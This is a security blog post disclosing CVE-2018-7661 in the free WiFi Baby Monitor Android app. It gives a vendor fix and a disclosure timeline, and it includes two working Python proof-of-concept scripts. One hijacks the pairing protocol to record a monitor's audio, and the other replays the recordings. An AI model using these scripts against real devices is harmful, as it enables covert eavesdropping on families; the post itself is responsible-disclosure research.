<!doctype html>
<html>
<head>
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-112541699-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());

        gtag('config', 'UA-112541699-1');
</script>
<base href="/">
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta name="author" content="Jay">

<meta name="description" content="">

<title>Eavesdropping on WiFi Baby Monitor</title>
<meta name="generator" content="Hugo 0.20" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.1.0/styles/pojoaque.min.css">
<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.1.0/highlight.min.js"></script>
<script>hljs.initHighlightingOnLoad();</script>

<link href="https://fonts.googleapis.com/css?family=Source+Code+Pro:400,700" rel="stylesheet" type="text/css">
<link  href="https://blog.manchestergreyhats.co.uk/css/theme.min.css" rel="stylesheet" type="text/css">

</head>
<body>
<div class="page-container container-fluid">
<div class="col-md-3 menu">
    <nav class="col-md-3">
    <h3 class="home-link"><a href="https://blog.manchestergreyhats.co.uk">Root</a></h3>
    <div id="last-posts" class="open">
        <h3 data-open="last-posts">MGH Blog - Most recent posts</h3>
        <ul>
            
            <li><a href="https://blog.manchestergreyhats.co.uk/posts/2020-01-10-pwnagotchi-setup/">Pwnagotchi Set Up</a></li>
            
            <li><a href="https://blog.manchestergreyhats.co.uk/posts/cyber-strike-vs-air-strike/">Cyber Strike vs Air Strike</a></li>
            
            <li><a href="https://blog.manchestergreyhats.co.uk/2018/11/27/php-malware-examination-part-2/">PHP Malware Examination Part 2</a></li>
            
            <li><a href="https://blog.manchestergreyhats.co.uk/2018/11/07/php-malware-examination/">PHP Malware Examination</a></li>
            
            <li><a href="https://blog.manchestergreyhats.co.uk/2018/10/18/owasp-ctf-prep-crypto/">OWASP CTF Prep - Crypto Challenge</a></li>
            
            <li><a href="https://blog.manchestergreyhats.co.uk/2018/10/18/owasp-ctf-prep/">OWASP CTF Prep</a></li>
            
            <li><a href="https://blog.manchestergreyhats.co.uk/2018/05/30/bob-vulnhub-ctf-writeup/">Bob Vulnhub Vm Writeup</a></li>
            
            <li><a href="https://blog.manchestergreyhats.co.uk/2018/04/21/stem-ctf-cyber-challenge/">STEM CTF Cyber Challenge 2018 Write Up</a></li>
            
            <li><a href="https://blog.manchestergreyhats.co.uk/2018/04/18/aes-decode-with-cyberchef/">AES decode with Cyberchef</a></li>
            
            <li><a href="https://blog.manchestergreyhats.co.uk/2018/03/28/m1con-ctf-writeup/">M1Con CTF Write up</a></li>
            
        </ul>
    </div>

    
    <div id="tags" class="open">
        <h3 data-open="tags">Tags</h3>
        <ul class="tags">
            
            <li><a href="/tags/analysis">analysis</a></li>
            
            <li><a href="/tags/android">android</a></li>
            
            <li><a href="/tags/arp">arp</a></li>
            
            <li><a href="/tags/blog">blog</a></li>
            
            <li><a href="/tags/brett">brett</a></li>
            
            <li><a href="/tags/burpsuite">burpsuite</a></li>
            
            <li><a href="/tags/crypto">crypto</a></li>
            
            <li><a href="/tags/ctf">ctf</a></li>
            
            <li><a href="/tags/cyberchef">cyberchef</a></li>
            
            <li><a href="/tags/dkim">dkim</a></li>
            
            <li><a href="/tags/dmarc">dmarc</a></li>
            
            <li><a href="/tags/dns">dns</a></li>
            
            <li><a href="/tags/frida">frida</a></li>
            
            <li><a href="/tags/hacking">hacking</a></li>
            
            <li><a href="/tags/hardware">hardware</a></li>
            
            <li><a href="/tags/how-to">how-to</a></li>
            
            <li><a href="/tags/infosec">infosec</a></li>
            
            <li><a href="/tags/iot">iot</a></li>
            
            <li><a href="/tags/jay">jay</a></li>
            
            <li><a href="/tags/jobs">jobs</a></li>
            
            <li><a href="/tags/john-w">john-w</a></li>
            
            <li><a href="/tags/journeys">journeys</a></li>
            
            <li><a href="/tags/linux">linux</a></li>
            
            <li><a href="/tags/lockpicking">lockpicking</a></li>
            
            <li><a href="/tags/mail-servers">mail-servers</a></li>
            
            <li><a href="/tags/malware">malware</a></li>
            
            <li><a href="/tags/mgh">mgh</a></li>
            
            <li><a href="/tags/mitm">mitm</a></li>
            
            <li><a href="/tags/mobile">mobile</a></li>
            
            <li><a href="/tags/mr-robot">mr-robot</a></li>
            
            <li><a href="/tags/osint">osint</a></li>
            
            <li><a href="/tags/owasp">owasp</a></li>
            
            <li><a href="/tags/paths">paths</a></li>
            
            <li><a href="/tags/paulw">paulw</a></li>
            
            <li><a href="/tags/php">php</a></li>
            
            <li><a href="/tags/raspberry-pi">raspberry-pi</a></li>
            
            <li><a href="/tags/recruiter">recruiter</a></li>
            
            <li><a href="/tags/reddit">reddit</a></li>
            
            <li><a href="/tags/responsible-disclosure">responsible-disclosure</a></li>
            
            <li><a href="/tags/router">router</a></li>
            
            <li><a href="/tags/sdr">sdr</a></li>
            
            <li><a href="/tags/shell-script">shell-script</a></li>
            
            <li><a href="/tags/short">short</a></li>
            
            <li><a href="/tags/spf">spf</a></li>
            
            <li><a href="/tags/tim">tim</a></li>
            
            <li><a href="/tags/timw">timw</a></li>
            
            <li><a href="/tags/uart">uart</a></li>
            
            <li><a href="/tags/usb">usb</a></li>
            
            <li><a href="/tags/vulnhub">vulnhub</a></li>
            
            <li><a href="/tags/web-application">web-application</a></li>
            
            <li><a href="/tags/websec">websec</a></li>
            
            <li><a href="/tags/weekend-projects">weekend-projects</a></li>
            
            <li><a href="/tags/wi-fi">wi-fi</a></li>
            
            <li><a href="/tags/working-in-infosec">working-in-infosec</a></li>
            
        </ul>
    </div>
    

    
    <div id="categories" class="open">
        <h3 data-open="categories">Categories</h3>
        <ul class="categories">
            
            <li><a href="/categories/articles">articles</a></li>
            
            <li><a href="/categories/authors">authors</a></li>
            
            <li><a href="/categories/ctf">ctf</a></li>
            
            <li><a href="/categories/misc">misc</a></li>
            
            <li><a href="/categories/talks">talks</a></li>
            
            <li><a href="/categories/workshop">workshop</a></li>
            
        </ul>
    </div>
    
</nav>

</div>
<div class="col-md-9 content">

<h1>Eavesdropping on WiFi Baby Monitor</h1>
<h4>Published 02-25-2018 00:00:00</h4>

<a href="https://twitter.com/share" class="twitter-share-button" data-via="mcrgreyhats"></a>
<script>!function (d, s, id) {
    var js, fjs = d.getElementsByTagName(s)[0], p = /^http:/.test(d.location) ? 'http' : 'https';
    if (!d.getElementById(id)) {
        js = d.createElement(s);
        js.id = id;
        js.src = p + '://platform.twitter.com/widgets.js';
        fjs.parentNode.insertBefore(js, fjs);
    }
}(document, 'script', 'twitter-wjs');</script>

<div class="fb-share-button" data-href="https://blog.manchestergreyhats.co.uk/2018/02/25/eavesdropping-on-wifi-baby-monitor/" data-layout="button"></div>
<div id="fb-root"></div>
<script>(function(d, s, id) {
    var js, fjs = d.getElementsByTagName(s)[0];
    if (d.getElementById(id)) return;
    js = d.createElement(s); js.id = id;
    js.src = "//connect.facebook.net/en-US/sdk.js#xfbml=1&version=v2.5";
    fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>

<article>
    

<p>Written by <a href="/authors/rob/">Rob</a></p>

<p>Whilst analysing a number of free communication based applications on the Google Play Store, I took a look at <a href="https://play.google.com/store/apps/details?id=com.papenmeier.wifibabymonitor.free&amp;hl=en_GB">WiFi Baby Monitor: Free &amp; Lite</a> (the free version of <a href="https://play.google.com/store/apps/details?id=com.papenmeier.wifibabymonitor&amp;hl=en_GB">WiFi Baby Monitor</a>). Although the premium version offered users the ability to specify a password to be used in the pairing process, the free version offered no such function.</p>

<p>Monitoring the traffic using Wireshark during the pairing process revealed:</p>

<ul>
<li>The initial connection is made on port 8257</li>
<li>To start the pairing process, the same sequence is sent each time</li>
<li>After the pairing process is finished, another connection is opened to port 8258, where the audio data will be transmitted</li>
<li>After the connection is made to port 8258, the connection on port 8257 is kept open and used as a heartbeat for the session</li>
<li>On the heartbeat connection, the client will periodically send <code>0x01</code> to the baby monitor (roughly once per second)</li>
</ul>

<h2 id="abusing-the-protocol-to-record-audio">Abusing The Protocol to Record Audio</h2>

<p>With the pairing process reversed, it was possible to create a proof of concept which proved that it was possible to deploy a small program into a compromised network which would eavesdrop on a baby monitor and allow for an attacker to play the recording back at a later date at their discretion.</p>

<p>The [very hacky] proof of concept code can be found below:</p>

<pre><code class="language-python">import socket
import sys
import time

if len(sys.argv) &lt; 2:
    print &quot;Usage: python {file} target_ip [port]&quot;.format(file = sys.argv[0])
    exit(1)

target = sys.argv[1]
port = 8257

if len(sys.argv) == 3:
    port = int(sys.argv[2])

s = socket.socket()
s.connect((target, port))
s.send('\x01')
s.send('\x02\x64\x00\x00\x00\x13\x2b\x52\x65\x63\x65\x69\x76\x65\x72\x53' +
       '\x74\x61\x72\x74\x5f\x32\x2e\x30\x32\x00\x00\x00\x00\x03\x23\x31' +
       '\x30\x00\x00\x00\x00\x03\x23\x32\x30\x00\x00\x00\x00\x03\x23\x32' +
       '\x31\x00\x00\x00\x00\x03\x23\x32\x32\x00\x00\x00\x00\x03\x23\x32' +
       '\x33')

heartbeat_dump = open('dump.heartbeat.bin', 'wb')
data_dump = open('dump.data.bin', 'wb')

has_data_socket = False
data_socket = socket.socket()
delta = 0

while True:
    time.sleep(1)
    data = s.recv(2048)
    if data is not None:
        heartbeat_dump.write(data)
        print '[*] Received {bytes} bytes on heartbeat socket'.format(bytes = len(data))
        s.send('\x01')

    if has_data_socket:
        data = data_socket.recv(2048)
        if data is not None:
            data_dump.write(data)
            print '[*] Received {bytes} bytes on data socket'.format(bytes = len(data))
            data_socket.send('\x01')
    else:
        print '[*] Establishing data connection'
        data_socket.connect((target, 8258))
        data_socket.send('\x01')
        data_socket.send('\x02\x64\x00\x00\x00\x07\x33\x5f\x5f\x30\x30\x30\x30')
        has_data_socket = True
        print '[*] Established data connection'

    delta += 1

heartbeat_dump.close
data_dump.close
</code></pre>

<p>This script establishes a connection to the baby monitor and begins to dump out the data from port 8257 to <code>dump.heartbeat.bin</code> and the data from port 8258 to <code>dump.data.bin</code>.</p>

<h2 id="replaying-the-recordings">Replaying the Recordings</h2>

<p>In order to replay the recordings made by the proof of concept, I created a second script which would act as a baby monitor and replay the data back to a client; which allows for replay via the original application:</p>

<pre><code class="language-python">import socket
import sys
import time

s = socket.socket()
s.bind(('0.0.0.0', 8257))
s.listen(5)
print '[*] Heartbeat socket listening on port 8257'

data_socket = socket.socket()
data_socket.bind(('0.0.0.0', 8258))
data_socket.listen(5)
print '[*] Data socket listening on port 8258'

data = ''
with open('dump.heartbeat.bin', 'r') as replay_file:
    data = replay_file.read()

wav_data = ''
with open('dump.data.bin', 'r') as wav_file:
    wav_data = wav_file.read()

c, addr = s.accept()
print '[*] Connection from {client}'.format(client = addr)
c.send(data)

data_connection, addr = data_socket.accept()
print '[*] Data connection from {client}'.format(client = addr)
data_connection.send(wav_data)

buf_start = 0
buf_end = wav_data.find('\x00\x00\x00\x01', 1)
buf = wav_data[buf_start:buf_end]

while buf is not None:
    c.send('\x01')
    print '[*] Sending {bytes} bytes'.format(bytes = len(buf))
    data_connection.send(buf)
    time.sleep(0.1)

    if buf_end == -1 or buf_start == -1:
        buf = None
    else:
        buf_start = buf_end
        buf_end = wav_data.find('\x00\x00\x00\x01', buf_end + 1)
        if buf_end == -1:
            buf = wav_data[buf_start:]
        else:
            buf = wav_data[buf_start:buf_end]

data_connection.close()
c.close()
print '[*] Connection closed'
</code></pre>

<p>A demonstration of the replay script accepting a connection from a client and replaying a recording can be seen below:</p>

<iframe src="https://player.vimeo.com/video/258487598" width="640" height="360" frameborder="0" webkitallowfullscreen mozallowfullscreen allowfullscreen></iframe>

<h2 id="solution">Solution</h2>

<p>When notified, the vendor took the [respectably] responsible approach and made available to the free version the security features that were previously exclusive to the premium version.</p>

<p>To prevent this attack, users can simply update to the latest version of the application (v2.02.2, at the time of writing this).</p>

<h2 id="cve-id">CVE-ID</h2>

<p><a href="https://www.cvedetails.com/cve/CVE-2018-7661/">CVE-2018-7661</a></p>

<h2 id="cvss-score">CVSS Score</h2>

<p><strong>CVSS Base Score</strong>: 5.9</p>

<p><strong>Impact Subscore</strong>: 4.2</p>

<p><strong>Exploitability Subscore</strong>: 1.6</p>

<p><strong>CVSS Temporal Score</strong>: 5.3</p>

<p><strong>Overall CVSS Score</strong>: 5.3</p>

<p><strong>Vector:</strong> <a href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:A/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:H/E:P/RL:O/RC:C">AV:A/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:H/E:P/RL:O/RC:C</a></p>

<h2 id="disclosure-timeline">Disclosure Timeline</h2>

<ul>
<li><strong>2018-02-11</strong>: Initial contact with vendor to make them aware of the attack vector</li>
<li><strong>2018-02-12</strong>: Vendor acknowledged the issue and provided keys to test the premium version to verify the encryption and password protection would resolve the issue</li>
<li><strong>2018-02-15</strong>: Confirmation sent to vendor to let them know the proposed solution should nullify the attack</li>
<li><strong>2018-02-16</strong>: Vendor begins roll-out process for the new update</li>
<li><strong>2018-02-22</strong>: Roll-out process completed and version 2.02.2 made available to the public</li>
</ul>

</article>



</div>
</div>
<script src="https://blog.manchestergreyhats.co.uk/js/theme.min.js" type="text/javascript"></script>


</body>
</html>

